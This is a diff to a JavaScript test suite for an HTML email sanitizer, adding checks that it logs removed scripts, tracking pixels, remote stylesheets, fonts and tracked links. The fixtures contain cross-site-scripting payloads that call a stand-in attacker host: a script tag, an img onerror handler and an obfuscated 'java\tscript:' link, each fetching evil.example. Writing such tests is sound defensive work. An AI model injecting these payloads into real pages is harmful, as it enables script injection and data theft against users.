@@ -184,7 +184,7 @@ test('unwraps encoded click wrappers when the destination is still visible', () 
 });
 
 test('strips scripts and executable markup even when remote images stay', () => {
-	const { document, html } = render(`
+	const { document, html, stats } = render(`
 		<script>fetch('https://evil.example')</script>
 		<img src="https://cdn.example.com/logo.png" width="40" height="40" onerror="fetch('https://evil.example')">
 		<a href="java\tscript:fetch('https://evil.example')">x</a>
@@ -210,4 +210,26 @@ test('strips scripts and executable markup even when remote images stay', () => 
 	assert.match(document.body.textContent, /keep/);
 	assert.doesNotMatch(document.querySelector('div').getAttribute('style') || '', /expression|javascript:/i);
 	assert.doesNotMatch(html, /evil\.example\/steal|http-equiv/i);
+	assert.ok(stats.findings.some(item => item.kind === 'active' && item.name === 'script'));
+	assert.ok(stats.findings.some(item => item.kind === 'active' && item.name === 'onerror' && item.target === 'img'));
+	assert.equal(stats.findings.some(item => item.kind === 'remote'), false);
+});
+
+test('records the remote items, pixels, styles, and links removed from this message', () => {
+	const { stats } = render(`
+		<img alt="Logo" src="https://cdn.example.com/logo.png">
+		<img src="https://track.example.com/pixel.gif" width="1" height="1">
+		<link rel="stylesheet" href="https://cdn.example.com/a.css">
+		<style>@import url("https://cdn.example.com/b.css"); @font-face { src: url("https://cdn.example.com/f.woff"); }</style>
+		<a href="https://example.com/item?id=2&amp;utm_source=news">item</a>
+		<a rel="prefetch" href="https://example.com/next">next</a>
+	`, { blockRemote: true });
+	assert.ok(stats.findings.some(item => item.kind === 'remote' && item.url === 'https://cdn.example.com/logo.png'));
+	assert.ok(stats.findings.some(item => item.kind === 'pixel' && item.url === 'https://track.example.com/pixel.gif'));
+	assert.ok(stats.findings.some(item => item.kind === 'stylesheet' && item.url === 'https://cdn.example.com/a.css'));
+	assert.ok(stats.findings.some(item => item.kind === 'import' && item.url === 'https://cdn.example.com/b.css'));
+	assert.ok(stats.findings.some(item => item.kind === 'font' && item.url === 'https://cdn.example.com/f.woff'));
+	assert.ok(stats.findings.some(item => item.kind === 'link' && item.url === 'https://example.com/item?id=2' && item.from.includes('utm_source')));
+	assert.ok(stats.findings.some(item => item.kind === 'active' && item.name === 'prefetch' && item.url === 'https://example.com/next'));
+	assert.equal(stats.omitted, 0);
 });
